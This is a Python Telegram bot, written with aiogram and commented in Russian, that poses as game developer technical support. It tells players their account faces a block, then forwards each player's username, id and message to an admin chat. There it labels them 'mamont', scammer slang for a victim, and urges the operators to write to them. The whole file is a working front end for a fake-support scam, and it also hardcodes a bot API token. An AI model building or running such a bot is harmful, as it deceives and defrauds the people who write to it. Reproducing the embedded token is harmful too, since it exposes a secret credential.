import logging
import time
import subprocess

from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor



API_TOKEN = '6908967381:AAEwsLTDv2NNMJJKxOvcapT99HH0I4oW-q4'

#chatik
admin_chat_ids = ['-4148878192']

#admin id 
admin_user_id = '6815312419'

#Dispatcher bot 


logging.basicConfig(level=logging.INFO)

last_support_request_time = {}
active_chats = {}
waiting_users = {}

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

async def notify_admin(message_text, user):
    admin_text = f"Нам написал мамонтенок\n" \
                 f"user: [@{user.username}]\n" \
                 f"user_id: [{user.id}]\n" \
                 f"Nick Name: [{user.full_name}]\n\n" \
                 f"сообщение от мамонта: {message_text}\n\n" \
                 f"Напишите ему!!!!!" \

    for admin_chat_id in admin_chat_ids:
        await bot.send_message(chat_id=admin_chat_id, text=admin_text)

# /start
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    keyboard = InlineKeyboardMarkup(row_width=2)

    # Кнопка "Информация"
    info_button = InlineKeyboardButton("Информация", callback_data='info')
    keyboard.add(info_button) 

    # Кнопка "Тех.Поддержка"
    chat_button = InlineKeyboardButton("Тех.Поддержка", callback_data='chat')
    keyboard.add(chat_button)

    # Приветственное сообщение с клавиатурой
    welcome_text = "Привет! Выберите опцию из меню:"
    await message.answer(welcome_text, reply_markup=keyboard)

# Обработка инлайн запросов для тех.поддержки



# Обработка команды /info
@dp.callback_query_handler(lambda query: query.data == 'info')
async def process_info_callback(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    info_text = "Бот создан для прямой связи с разработчиками.\n \nЕсли вашему аккаунту грозит блокировка (вы получили уведомлениее от нашего бота в самой игре) то вам нужно нажать на кнопку 'тех.поддержка'"
    await bot.send_message(callback_query.from_user.id, info_text)




# Обработка текстовых сообщений
@dp.message_handler(content_types=types.ContentType.TEXT)
async def handle_text(message: types.Message):
    if message.text.startswith('/'):
        return

    # Отправляем уведомление админам о сообщении от пользователя
    await notify_admin(message.text, message.from_user)

    # Отвечаем пользователю
    reply_text = "Я получил ваше сообщение. В ближайшее время с вами свяжется техническая поддержка. \nНе выходите с телеграма и читайте личные сообщение(Вам напишут в течение 5 минут)"
    await message.reply(reply_text)




# Запуск бота
if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)